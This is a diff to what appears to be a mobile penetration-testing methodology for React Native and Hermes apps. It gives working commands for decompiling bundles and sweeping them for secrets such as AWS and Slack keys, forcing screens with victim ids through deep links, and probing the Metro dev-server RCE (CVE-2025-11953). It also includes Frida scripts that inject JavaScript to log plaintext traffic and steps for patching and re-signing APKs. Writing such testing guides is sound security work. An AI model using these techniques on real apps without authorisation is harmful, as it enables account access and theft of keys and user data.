-  hbcdump ext/assets/index.android.bundle -c 'function-string-table'  # from the matching Hermes release
-  npx react-native-decompiler -i ext/assets/index.android.bundle -o ./output   # plain-JS bundles only
+  hbc-file-parser  $DEC/raw/assets/index.android.bundle          # header + table sizes
+  hbc-disassembler $DEC/raw/assets/index.android.bundle out.hasm
+  hbc-decompiler   $DEC/raw/assets/index.android.bundle out.js
+  hermes-decomp decompile $DEC/raw/assets/index.android.bundle -o "$DEC/hermes/"     # if the version is beyond hbctool
+  hbcdump $DEC/raw/assets/index.android.bundle -c 'function-string-table'  # from the matching Hermes release
+  npx react-native-decompiler -i $DEC/raw/assets/index.android.bundle -o ./output   # plain-JS bundles only
   ```
 - **Proof:** A `.hasm`/`.js` output whose string operands resolve to real app strings — your target's API
   hostnames, `AsyncStorage` key names, screen names. Garbage opcodes or an immediate "unsupported version"
@@ -446,7 +479,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Requires** | react-native, hermes |
 | **Maps to** | facebook/hermes `BytecodeFileFormat.h` (`stringCount`, `overflowStringCount`, `stringStorageSize`, `SmallStringTableEntry`) |
 
-- **Test:** Even with an unsupported HBC version, every string literal is recoverable: the string table is a
+- **Test:** (Owner of the Hermes string-table test; D01-026 duplicates it together with D19-008 — run both here and record one verdict on each id.) Even with an unsupported HBC version, every string literal is recoverable: the string table is a
   flat blob fully described by header fields. `strings(1)` badly under-reports here, because Hermes packs
   strings contiguously without terminators — you get a few enormous lines instead of the real table.
 - **How:** Header layout: magic (8 B), version (4 B), sourceHash (20 B), then `uint32` fields
@@ -455,10 +488,13 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   in order: functionHeaders (`functionCount*16`), stringKinds (`*4`), identifierHashes (`*4`), stringTable
   (`*4`), overflowStringTable (`*8`), stringStorage. `SmallStringTableEntry` is a packed `uint32`:
   bit 0 = `isUTF16`, bits 1–23 = offset, bits 24–31 = length; length `0xFF` means overflow, and the offset
-  then indexes an 8-byte `(offset,length)` pair in the overflow table.
+  then indexes an 8-byte `(offset,length)` pair in the overflow table. **Validate the layout before trusting the
+  offsets:** run `hbc-file-parser` (or `hermes-decomp info`) first and compare its `stringCount`/`stringStorageSize`
+  with the values the parser reads at offsets 52/60 — if they differ, the Hermes V1 header layout has moved and the
+  offsets must be re-derived from `BytecodeFileFormat.h` of the matching Hermes release.
   ```python
   import struct
-  d = open('ext/assets/index.android.bundle','rb').read()
+  d = open('$DEC/raw/assets/index.android.bundle','rb').read()
   u32 = lambda o: struct.unpack('<I', d[o:o+4])[0]
   fc, skc, ic, sc, osc = u32(40), u32(44), u32(48), u32(52), u32(56)
   a = lambda x: (x + 3) & ~3
@@ -476,15 +512,17 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   print('recovered', len(out), 'strings')
   ```
   ```bash
-  hermes-decomp strings ext/assets/index.android.bundle    # structured alternative, preserves table order
-  hbc-file-parser ext/assets/index.android.bundle          # confirms stringCount/stringStorageSize coverage
+  hermes-decomp strings $DEC/raw/assets/index.android.bundle    # structured alternative, preserves table order
+  hbc-file-parser $DEC/raw/assets/index.android.bundle          # confirms stringCount/stringStorageSize coverage
   ```
 - **Proof:** A recovered-string count matching the header's `stringCount`, and a sanity check that the first
   ~120 bytes at your computed `stringStorage` offset are printable. If they are not, your header-size
-  assumption is wrong — fix it before drawing conclusions. One engagement recovered 545,000 strings this way
-  from a v96 bundle.
-- **Escalation:** Routes -> D19-010; endpoints -> D19-011 and D15; keys -> D19-012 and D18; storage key names
-  -> D19-024 and D11.
+  assumption is wrong — fix it before drawing conclusions. Then grep the plain-text `strings.txt` for one hostname
+  you saw in the proxy: if it is absent, the table parse is wrong — fix that before any downstream zero. Hundreds
+  of thousands of strings from a single bundle is a normal result.
+- **Escalation:** `strings.txt` (one string per line, no quotes — the Hermes table stores raw strings) is the
+  canonical input for every downstream grep on a Hermes bundle; `hbc.strings` is only for a plain Metro bundle.
+  Routes -> D19-010; endpoints -> D19-011 and D15; keys -> D19-012 and D18; storage key names -> D19-024 and D11.
 - **Ruled out when:** A supported decompiler (D19-008) already produced correct output, or the bundle is
   plain JS. Note the standing caveat for everything downstream: **the table is sorted and deduplicated, so
   string adjacency is a hint, never proof of a call site.** Any claim resting purely on adjacency is
@@ -495,7 +533,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what it exposes); `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) upward where the screen renders another user's data |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies — rated on what it exposes); `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) upward where the screen renders another user's data |
 | **Attacker** | AM-02 remote one-click via a deep link; AM-03 zero-permission local app via `am start` |
 | **Applies to** | React Native with React Navigation / react-native-navigation |
 | **Requires** | react-native, deeplink |
@@ -506,19 +544,20 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   features behind a flag.
 - **How:**
   ```bash
-  grep -aoE '"[A-Z][A-Za-z0-9]{3,30}(Screen|Page|View|Modal|Stack|Tab)"' hbc.strings | sort -u
-  grep -aoE '"(screens|linking|prefixes|config)"' hbc.strings | sort -u
-  grep -aiE 'isAdmin|hasRole|featureFlag|__DEV__|debugMenu|internalOnly|staffOnly' hbc.strings
-  grep -aoE '"[a-z][a-z0-9+.-]*://[^"]*"' hbc.strings | sort -u           # schemes the bundle knows
-  hermes-decomp xref ext/assets/index.android.bundle --query 'navigate'
-  hermes-decomp xref ext/assets/index.android.bundle --query 'createNativeStackNavigator'
-  hermes-decomp xref ext/assets/index.android.bundle --query 'getInitialURL'
-  hermes-decomp xref ext/assets/index.android.bundle --query 'addEventListener'
+  # Hermes: strings.txt from D19-009 (one raw string per line, no quotes); plain Metro bundle: hbc.strings with the quoted forms
+  grep -aoE '^[A-Z][A-Za-z0-9]{3,30}(Screen|Page|View|Modal|Stack|Tab)$' strings.txt | sort -u
+  grep -axE '(screens|linking|prefixes|config|initialRouteName)' strings.txt
+  grep -aiE 'isAdmin|hasRole|featureFlag|__DEV__|debugMenu|internalOnly|staffOnly' strings.txt
+  grep -aoE '^[a-z][a-z0-9+.-]*://[^ ]*$' strings.txt | sort -u           # schemes the bundle knows
+  hermes-decomp xref $DEC/raw/assets/index.android.bundle --query 'navigate'
+  hermes-decomp xref $DEC/raw/assets/index.android.bundle --query 'createNativeStackNavigator'
+  hermes-decomp xref $DEC/raw/assets/index.android.bundle --query 'getInitialURL'
+  hermes-decomp xref $DEC/raw/assets/index.android.bundle --query 'addEventListener'
   ```
   Then drive each candidate:
   ```bash
-  adb shell am start -a android.intent.action.VIEW -d "<scheme>://<screen-name>" <pkg>
-  adb shell am start -a android.intent.action.VIEW -d "<scheme>://<screen-name>?id=<victim-id>" <pkg>
+  adb -s "$SERIAL" shell am start -a android.intent.action.VIEW -d "<scheme>://<screen-name>" <pkg>
+  adb -s "$SERIAL" shell 'am start -a android.intent.action.VIEW -d "<scheme>://<screen-name>?id=<victim-id>&x=1" <pkg>'   # single-quote the remote command: the device sh re-parses ? & # *
   ```
 - **Proof:** A screen name taken from the bundle rendering via deep link without the UI's navigation guard,
   with that screen's data visible in a screenshot, and the Frida deep-link monitor showing the URI arriving
@@ -540,7 +579,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Attacker** | AM-01 remote no interaction (once you hold a route and a token) |
 | **Applies to** | all cross-platform frameworks |
 | **Requires** | flutter, react-native, unity, xamarin, cordova, capacitor, backend-api |
-| **Maps to** | MASTG-TOOL-0125 (apkleaks); hermes-decomp `strings`/`secrets` |
+| **Maps to** | MASTG-TOOL-0125 (apkleaks — it re-runs jadx: point it at existing output or skip it, and pre-filter its `JSON_Web_Token` / `Facebook_Secret_Key` buckets, which match TLD lists and any 32-hex string); hermes-decomp `strings`/`secrets` |
 
 - **Test:** Traffic observation only reveals the endpoints the UI happens to exercise. The bundle or
   snapshot contains the *full* client-side API surface, including admin, debug and feature-flagged routes
@@ -549,14 +588,14 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 - **How:**
   ```bash
   # React Native
-  grep -aoE 'https?://[A-Za-z0-9._~:/?#@!$&()*+,;=%-]+' hbc.strings | sort -u >  endpoints.txt
-  grep -aoE '["'\''`]/(api|v[0-9]+|graphql|internal|admin)[A-Za-z0-9._/{}$-]*' hbc.strings | sort -u >> endpoints.txt
+  grep -aoE 'https?://[A-Za-z0-9._~:/?#@!$&()*+,;=%-]+' strings.txt | sort -u >  endpoints.txt      # strings.txt (D19-009) for Hermes; hbc.strings for a plain Metro bundle
+  grep -aoE '^/(api|v[0-9]+|graphql|internal|admin)[A-Za-z0-9._/{}$-]*$' strings.txt | sort -u >> endpoints.txt   # the table stores raw strings: anchor, do not quote
   # Flutter
-  grep -aoE 'https?://[^ "]+|/(api|v[0-9]+)/[A-Za-z0-9._/{}-]+' out_dir/pp.txt | sort -u >> endpoints.txt
+  grep -aoE 'https?://[^ "]+|/(api|v[0-9]+)/[A-Za-z0-9._/{}-]+' $DEC/blutter/pp.txt | sort -u >> endpoints.txt
   # Unity / Xamarin
-  grep -aoE 'https?://[^ "]+' out/dump.cs out/assemblies/out/*.dll | sort -u >> endpoints.txt
+  grep -aoE 'https?://[^ "]+' "$DEC/il2cpp/dump.cs" "$DEC/assemblies/out/"*.dll | sort -u >> endpoints.txt
   # Cordova / Capacitor
-  grep -rnoE 'https?://[A-Za-z0-9._/-]+' out/assets/{www,public} | sed 's/.*://' | sort -u >> endpoints.txt
+  grep -rnoE 'https?://[A-Za-z0-9._/-]+' $DEC/apktool/assets/{www,public} | sed 's/.*://' | sort -u >> endpoints.txt
   sort -u endpoints.txt | grep -viE 'schema|w3\.org|github|npmjs|example\.com' > endpoints.final
   wc -l endpoints.final
   ```
@@ -579,7 +618,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Attacker** | AM-01 |
 | **Applies to** | React Native, Cordova/Ionic/Capacitor, and any framework that ships a JS/web bundle |
 | **Requires** | react-native, cordova, capacitor, backend-api |
-| **Maps to** | MASWE-0004 (CWE-798), MASTG-TECH-0019, MASTG-TOOL-0125 (apkleaks), MASTG-TOOL-0144 (gitleaks); hermes-decomp `secrets` |
+| **Maps to** | MASWE-0004 (CWE-798), MASTG-TECH-0019, MASTG-TOOL-0125 (apkleaks — re-runs jadx, pre-filter its `JSON_Web_Token` / `Facebook_Secret_Key` buckets), MASTG-TOOL-0144 (gitleaks — only with the positive control below; a tool's zero without a passed control is not a negative); hermes-decomp `secrets` |
 
 - **Test:** RN and Ionic apps routinely embed keys that are "public" by the vendor's framing but privileged
   in practice — Firebase server keys, Algolia admin keys, unrestricted Google Maps/billing keys, Stripe
@@ -591,8 +630,13 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   grep -aoE 'AKIA[0-9A-Z]{16}'                         hbc.strings | sort -u
   grep -aoE 'xox[baprs]-[0-9A-Za-z-]{10,}'             hbc.strings | sort -u
   grep -aiE 'secret|token|apikey|api_key|password|private_key|client_secret|jwt|admin.?key|master.?key|service.?account' hbc.strings
-  gitleaks detect --no-git --source ./decompiled/
-  hermes-decomp secrets ext/assets/index.android.bundle
+  # regex sweep is PRIMARY; every tool needs a positive control before its zero counts mean anything
+  printf 'AIza%s\n' "$(python3 -c 'import secrets;print(secrets.token_urlsafe(26)[:35])')" > "$E/logs/D19-012-control.txt"
+  gitleaks dir "$E/logs/D19-012-control.txt" --no-banner 2>&1 | tail -1     # must report 1 leak; if not, the tool is not an arbiter here
+  gitleaks dir "$DEC/apktool/res" --no-banner; gitleaks dir strings.txt --no-banner   # ONE path per call ('gitleaks dir a b' scans 0 bytes); 'detect --no-git --source' is the pre-8.19 syntax
+  trufflehog filesystem "$DEC/apktool/res" strings.txt "$DEC/blutter/pp.txt" --no-update 2>/dev/null | head   # second tool; matches keys adjacent to XML brackets that gitleaks' gcp rule misses
+  grep -a -oE 'EXPO_PUBLIC_[A-Z0-9_]+|REACT_APP_[A-Z0-9_]+' strings.txt | sort -u          # build-time env inlined into the bundle
+  hermes-decomp secrets $DEC/raw/assets/index.android.bundle
   # then validate, per service — never report a match alone:
   curl -s -o /dev/null -w '%{http_code}\n' "https://<service-endpoint>" -H "Authorization: <key>"
   ```
@@ -621,9 +665,9 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   analysis problem to reading original TypeScript/JSX with comments and internal endpoint names.
 - **How:**
   ```bash
-  unzip -l target.apk | grep -iE '\.map$|sourcemap'
-  find out/assets -name '*.map' -o -name '*.js.map'
-  grep -a -oE 'sourceMappingURL=[^ ]+' ext/assets/index.android.bundle
+  grep -iE '\.map$|sourcemap' "$E/logs/D19-001-apklist.txt"
+  find $DEC/apktool/assets -name '*.map' -o -name '*.js.map'
+  grep -a -oE 'sourceMappingURL=[^ ]+' $DEC/raw/assets/index.android.bundle
   # try the OTA/CDN host next to the bundle path you found in D19-025:
   curl -sI "https://<update-host>/<path>/index.android.bundle.map" | head -1
   curl -s  "https://<update-host>/<path>/index.android.bundle.map" | python3 -c \
@@ -654,14 +698,14 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   native code and contains no npm metadata.
 - **How:**
   ```bash
-  hermes-decomp modules ext/assets/index.android.bundle
-  hermes-decomp deps    ext/assets/index.android.bundle
-  strings -a ext/assets/index.android.bundle | grep -aoE 'node_modules/(@[a-z0-9._-]+/)?[a-z0-9._-]+' | sort -u
-  strings -a ext/assets/index.android.bundle | grep -aoE '"version":"[0-9]+\.[0-9]+\.[0-9]+"' | sort -u
-  npx react-native-decompiler -i ext/assets/index.android.bundle -o ./output --unpackOnly
+  hermes-decomp modules $DEC/raw/assets/index.android.bundle
+  hermes-decomp deps    $DEC/raw/assets/index.android.bundle
+  strings -a $DEC/raw/assets/index.android.bundle | grep -aoE 'node_modules/(@[a-z0-9._-]+/)?[a-z0-9._-]+' | sort -u
+  # a bare semver grep over the string table is noise (every dependency and asset has one): take versions from `hermes-decomp modules` / node_modules paths only
+  npx react-native-decompiler -i $DEC/raw/assets/index.android.bundle -o ./output --unpackOnly
   grep -rl "react-native-" output/ | sed 's#.*/##' | sort -u
   # native halves of RN packages:
-  unzip -l target.apk | grep -E 'lib/.*(reanimated|hermes|jsc|rnscreens|fbjni)'
+  grep -E 'lib/.*(reanimated|hermes|jsc|rnscreens|fbjni)' "$E/logs/D19-001-apklist.txt"
   ```
 - **Proof:** A list of `node_modules/<pkg>` paths recovered from the bundle, cross-checked against the
   repository's `package-lock.json` where you have it — a package present in the bundle but absent from the
@@ -692,7 +736,11 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   grep -a -n "react-native-document-picker" hbc.strings *.map 2>/dev/null
   grep -nE '"react-native-mmkv"|"react-native-document-picker"' package-lock.json yarn.lock pnpm-lock.yaml 2>/dev/null
   # CVE-2024-21668 impact proof — the key ends up in logcat:
-  adb logcat -c && adb shell monkey -p <pkg> 1 && adb logcat -d | grep -aiE 'mmkv|encryptionKey'
+  adb -s "$SERIAL" logcat -G 32M && adb -s "$SERIAL" logcat -c
+  adb -s "$SERIAL" shell log -t D19ctl "positive-control $(date +%s)"      # must appear in the saved dump below, or the buffer rotated
+  adb -s "$SERIAL" shell monkey -p <pkg> 1
+  adb -s "$SERIAL" logcat -d --pid=$(adb -s "$SERIAL" shell pidof -s <pkg>) > "$E/logs/D19-015-logcat.txt"; adb -s "$SERIAL" logcat -d | grep -c D19ctl
+  grep -aiE 'mmkv|encryptionKey' "$E/logs/D19-015-logcat.txt"
 
   # (b) known-malicious releases
   grep -nE '"react-native-international-phone-number"|"react-native-country-select"|@agnoliaarisian7180/string-argv|@usebioerhold8733/s-format|@react-native-aria/focus' \
@@ -731,19 +779,20 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Attacker** | AM-06 network attacker on the developer/CI network |
 | **Applies to** | React Native build environments where the repo or CI is in scope; patched by Meta in **version 20.0.0** |
 | **Requires** | react-native |
-| **Maps to** | **CVE-2025-11953** — `@react-native-community/cli`, CVSS **9.8**, unauthenticated attackers execute arbitrary OS commands via the package's development server |
+| **Maps to** | **CVE-2025-11953** — `@react-native-community/cli-server-api` 4.8.0 ≤ v < 20.0.0 (pulled in by `@react-native-community/cli`), CVSS **9.8**: the dev server's `POST /open-url` handler passes the request body to `open()`, giving unauthenticated OS command execution on the host running Metro |
 
 - **Test:** The CLI exposed an unauthenticated OS-command path through its development server. The exposure
   is the build host, not the shipped app — get the scoping right or the report is invalid.
 - **How:**
   ```bash
-  grep -n '"@react-native-community/cli"' package.json package-lock.json
-  npm ls @react-native-community/cli
+  grep -nE '"@react-native-community/cli(-server-api)?"' package.json package-lock.json yarn.lock pnpm-lock.yaml 2>/dev/null   # the vulnerable package is cli-server-api; hoisting pins it separately
+  npm ls @react-native-community/cli-server-api 2>/dev/null
   # is a dev server listening beyond loopback during builds/CI?
-  lsof -nP -iTCP:8081 -sTCP:LISTEN
+  lsof -nP -iTCP:8081 -sTCP:LISTEN                                   # bound to 0.0.0.0 or only 127.0.0.1?
+  curl -s -o /dev/null -w '%{http_code}\n' -X POST http://<host>:8081/open-url -H 'Content-Type: application/json' -d '{"url":"https://example.com"}'   # 200 from a non-loopback address on a vulnerable version; harmless URL only
   ```
-- **Proof:** A pinned CLI version below 20.0.0 while a Metro/dev server listens on `0.0.0.0:8081` on a host
-  within the engagement scope.
+- **Proof:** A `cli-server-api` version below 20.0.0 **and** the `/open-url` endpoint answering from a non-loopback
+  address, on a host within the engagement scope.
 - **Escalation:** Dev-host RCE -> source, signing-key and token theft -> a trojanised signed release
   (-> D17).
 - **Ruled out when:** The pinned version is ≥ 20.0.0, or the repository/CI is explicitly out of scope. Where
@@ -755,7 +804,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `server_side_injection.remote_code_execution_rce` (P1); `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (null) for the state-only variant |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1); `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (varies) for the state-only variant |
 | **Attacker** | AM-06 network attacker (serves the bundle); AM-03 zero-permission local app (sets `debug_http_host`, launches the dev activity) |
 | **Applies to** | React Native release builds that still ship `DevSupportManager` wiring |
 | **Requires** | react-native, device |
@@ -767,17 +816,19 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 - **How:**
   ```bash
   grep -a -nE 'packager|:8081|/index\.bundle|/open-debugger|/inspector/device|debuggerHost|DevSettings|DEV_SUPPORT|getUseDeveloperSupport|BundleDownloader|packagerHost' hbc.strings
-  grep -rn 'DevSupportManager\|getUseDeveloperSupport\|BundleDownloader\|packagerHost' out/sources out/smali/ | head
-  grep -nE 'android:exported="true"' out/AndroidManifest.xml | grep -iE 'dev|debug|inspector|test|playground'
-  adb shell dumpsys package <pkg> | grep -iE 'devsupport|DevSettings|Inspector'
-  adb shell cat /data/data/<pkg>/shared_prefs/*.xml | grep -i debug_http_host
-  adb shell am start -n <pkg>/com.facebook.react.devsupport.DevSettingsActivity
-  adb logcat | grep -iE 'ReactNative|DevServer|packager'
+  grep -rn 'DevSupportManager\|getUseDeveloperSupport\|BundleDownloader\|packagerHost' $DEC/jadx/sources $DEC/apktool/smali/ | head
+  grep -nE 'android:exported="true"' $DEC/apktool/AndroidManifest.xml | grep -iE 'dev|debug|inspector|test|playground'
+  adb -s "$SERIAL" shell dumpsys package <pkg> | grep -iE 'devsupport|DevSettings|Inspector'
+  adb -s "$SERIAL" shell 'run-as <pkg> sh -c "cat shared_prefs/*.xml"' | grep -i debug_http_host   # uid 2000 cannot read the sandbox; the glob must expand on the device
+  adb -s "$SERIAL" shell am start -n <pkg>/com.facebook.react.devsupport.DevSettingsActivity
+  adb -s "$SERIAL" logcat -G 32M && adb -s "$SERIAL" logcat -c && adb -s "$SERIAL" shell log -t D19ctl "positive-control $(date +%s)"
+  # drive the app, then: adb -s "$SERIAL" logcat -d > "$E/logs/D19-017-logcat.txt"; grep -c D19ctl "$E/logs/D19-017-logcat.txt"   (0 => rotated buffer)
+  grep -iE 'ReactNative|DevServer|packager' "$E/logs/D19-017-logcat.txt"
   ```
   Forcing the flag at runtime (only report it if it actually works — in a properly built release
   `DevSupportManagerImpl` is stripped and this crashes or no-ops):
   ```javascript
-  // frida -D "$SERIAL" -f <pkg> -l enable-dev.js
+  // frida -D "$SERIAL" -f <pkg> -l enable-dev.js -q -t 120
   Java.perform(function () {
     try {
       var Host = Java.use('com.facebook.react.ReactNativeHost');
@@ -813,15 +864,15 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   its own authorisation, because it generally assumes the JS caller is trusted.
 - **How:**
   ```bash
-  grep -rnE 'ReactContextBaseJavaModule|@ReactMethod|createNativeModules|ReactPackage|getName\(\)' out/sources | head -60
+  grep -rnE 'ReactContextBaseJavaModule|@ReactMethod|createNativeModules|ReactPackage|getName\(\)' $DEC/jadx/sources | head -60
   grep -a -oE 'NativeModules\.[A-Za-z0-9_]+' hbc.strings | sort -u
-  grep -rniE 'keychain|securestore|EncryptedSharedPreferences|MasterKey|MMKV|AsyncStorage|preferences_pb' out/sources | head
+  grep -rniE 'keychain|securestore|EncryptedSharedPreferences|MasterKey|MMKV|AsyncStorage|preferences_pb' $DEC/jadx/sources | head
   ```
   Then enumerate and call them live, from inside the app's own JS runtime:
   ```javascript
-  // hook.js — loaded via the CatalystInstanceImpl trick in D19-020
-  console.log(Object.keys(this.nativeModuleProxy || {}));
-  const mq = this.__fbBatchedBridge;                    // new architecture: global.__turboModuleProxy
+  // hook.js — loaded via the loader hook in D19-020 (legacy bridge or bridgeless)
+  console.log(Object.keys(this.nativeModuleProxy || global.__turboModuleProxy || {}));
+  const mq = this.__fbBatchedBridge;                    // new architecture / bridgeless: global.__turboModuleProxy
   const orig = mq.callFunctionReturnFlushedQueue.bind(mq);
   mq.callFunctionReturnFlushedQueue = function () {
     console.log('[bridge]', JSON.stringify(arguments)); return orig.apply(null, arguments);
@@ -861,13 +912,13 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   `com.android.webview.chromium.ContentSettingsAdapter`.
 - **How:**
   ```bash
-  grep -rn 'createNativeModules\|ReactPackage\|@Provides\|@Binds' out/sources
-  grep -rn 'getName()' out/sources -A3 | grep -B1 'return "'      # JS name <- Java class mapping
+  grep -rn 'createNativeModules\|ReactPackage\|@Provides\|@Binds' $DEC/jadx/sources
+  grep -rn 'getName()' $DEC/jadx/sources -A3 | grep -B1 'return "'      # JS name <- Java class mapping
   ```
   For (2), either invoke the underlying parse method directly, or cold-start the app with the data present:
   ```bash
-  adb shell am force-stop <pkg>
-  adb shell am start -a android.intent.action.VIEW -d "<scheme>://<payload>" <pkg>   # data present at construction
+  adb -s "$SERIAL" shell am force-stop <pkg>
+  adb -s "$SERIAL" shell am start -a android.intent.action.VIEW -d "<scheme>://<payload>" <pkg>   # data present at construction
   ```
 - **Proof:** The mapping written out explicitly in your notes — the worked retraction from this corpus is
   that `com.oblador.keychain.KeychainModule` is exposed to JS as `RNKeychainManager`, and a report that read
@@ -894,23 +945,30 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   TLS, so pinning stops mattering.
 - **How:**
   ```bash
-  adb push hook.js /data/local/tmp/hook.js
-  adb shell "run-as <pkg> cp /data/local/tmp/hook.js files/hook.js" 2>/dev/null || \
-    adb shell su -c "cp /data/local/tmp/hook.js /data/data/<pkg>/files/hook.js && chown <uid>:<uid> /data/data/<pkg>/files/hook.js"
-  frida -D "$SERIAL" -f <pkg> -l inject-bundle.js
+  adb -s "$SERIAL" push hook.js /data/local/tmp/hook.js
+  adb -s "$SERIAL" shell "run-as <pkg> cp /data/local/tmp/hook.js files/hook.js" 2>/dev/null || \
+    adb -s "$SERIAL" shell 'su -c "cp /data/local/tmp/hook.js /data/data/<pkg>/files/hook.js && chown <uid>:<uid> /data/data/<pkg>/files/hook.js"'   # single-quoted, or the && runs chown as uid 2000
+  frida -D "$SERIAL" -f <pkg> -l inject-bundle.js -q -t 120
   ```
   ```javascript
-  // inject-bundle.js
+  // inject-bundle.js — legacy bridge (CatalystInstanceImpl) and bridgeless (ReactInstance, RN >= 0.76 default)
   Java.perform(function () {
-    var C = Java.use('com.facebook.react.bridge.CatalystInstanceImpl');
-    C.loadScriptFromAssets.implementation = function (am, url, z) {
-      this.loadScriptFromAssets(am, url, z);
-      this.loadScriptFromFile('/data/data/<pkg>/files/hook.js','/data/data/<pkg>/files/hook.js', z);
-    };
+    ['com.facebook.react.bridge.CatalystInstanceImpl', 'com.facebook.react.runtime.ReactInstance'].forEach(function (cn) {
+      try {
+        var C = Java.use(cn);
+        if (!C.loadScriptFromAssets) return;
+        C.loadScriptFromAssets.overloads.forEach(function (o) { o.implementation = function () {
+          var r = o.apply(this, arguments);
+          this.loadScriptFromFile('/data/data/<pkg>/files/hook.js', 'file:///data/data/<pkg>/files/hook.js', false);
+          return r; }; });
+        console.log('[+] hooked', cn);
+      } catch (e) { console.log('[-] ' + cn + ': ' + e.message); }
+    });
   });
   ```
   ```javascript
   // hook.js — full plaintext request/response logging, TLS-independent
+  var isBridgeless = (global.RN$Bridgeless === true);           // bridgeless: modules via global.__turboModuleProxy, not this.nativeModuleProxy
   this.XMLHttpRequest._interceptor = {
     requestSent:      (id, url, method, headers) => console.log('REQ', id, method, url, JSON.stringify(headers)),
     responseReceived: (id, url, status, h)       => console.log('RES', id, status, url),
@@ -925,8 +983,9 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   logged with pinning still enabled.
 - **Escalation:** Unblocks the whole of -> D15 for a pinned RN app without ever touching TLS; feeds D19-018.
   Caveat from the source author: React component props could not be overridden this way.
-- **Ruled out when:** `CatalystInstanceImpl` is absent (new architecture — use `global.__turboModuleProxy`),
-  or the app refuses to start under Frida. Neither is a finding: the app detecting Frida is a P5 resilience
+- **Ruled out when:** Neither loader class is present
+  (`Java.enumerateLoadedClassesSync().filter(c => /ReactInstance|CatalystInstanceImpl/.test(c))` is empty — then
+  the app is not React Native at all), or the app refuses to start under Frida. Neither is a finding: the app detecting Frida is a P5 resilience
   observation (see the Graveyard).
 
 ### D19-021 · Patch a Hermes string, reassemble, and prove the bundle carries no integrity control
@@ -946,19 +1005,19 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   `__DEV__`-style sentinel) is far cheaper than reassembly and is enough for most PoCs.
 - **How:**
   ```bash
-  apktool d target.apk -o out/
+  # decompiled by P2 into $DEC ($DEC/apktool, $DEC/jadx/sources); $DEC/raw holds the unpacked splits
   # HBC <= 76 — full round trip:
-  hbctool disasm out/assets/index.android.bundle hasm/
+  hbctool disasm $DEC/apktool/assets/index.android.bundle hasm/
   #   edit hasm/instruction.hasm: flip a StrictEqual/Greater/Less, change a LoadConstUInt8 0 -> 1,
   #   retarget a conditional jump, or swap a string operand
-  hbctool asm hasm/ out/assets/index.android.bundle
+  hbctool asm hasm/ $DEC/apktool/assets/index.android.bundle
   # Modern HBC — patch a string in place instead:
-  hermes-decomp patch-string out/assets/index.android.bundle --help
+  hermes-decomp patch-string $DEC/apktool/assets/index.android.bundle --help
   # repack and re-sign
-  rm -rf out/META-INF
-  apktool b out/ -o repacked.apk
+  rm -rf "$DEC/apktool/original/META-INF"
+  apktool b "$DEC/apktool" -o repacked.apk
   java -jar uber-apk-signer.jar --apks repacked.apk
-  adb install -r repacked-aligned-debugSigned.apk
+  adb -s "$SERIAL" install -r repacked-aligned-debugSigned.apk
   ```
   Alternatives when `hbctool` refuses the version: `hasmer disasm ./index.android.bundle -o hasm_out`;
   `hermes_rs` for HBC 76/89/90/93/94/95/96 (binary assembler, no textual form).
@@ -978,7 +1037,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when `injectedJavaScriptObject` carries a session token into a page that can be navigated off-origin; `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) for the covert camera/mic case |
+| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when `injectedJavaScriptObject` carries a session token into a page that can be navigated off-origin; `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) for the covert camera/mic case |
 | **Attacker** | AM-02 remote one-click |
 | **Applies to** | React Native apps using `react-native-webview`; the media half also applies to Unity apps using `unity-webview` |
 | **Requires** | react-native, webview, js-bridge |
@@ -997,8 +1056,8 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
            injectedJavaScriptObject setSupportMultipleWindows javaScriptEnabled \
            webContentsDebuggingEnabled; do
     printf '%-40s %s\n' "$p" "$(grep -a -c "$p" hbc.strings)"; done
-  hermes-decomp xref ext/assets/index.android.bundle --query 'injectedJavaScript'
-  grep -rn "ReactNativeWebView\|unity-webview\|UNITYWEBVIEW_ANDROID_ENABLE_CAMERA\|UNITYWEBVIEW_ANDROID_ENABLE_MICROPHONE" out/
+  hermes-decomp xref $DEC/raw/assets/index.android.bundle --query 'injectedJavaScript'
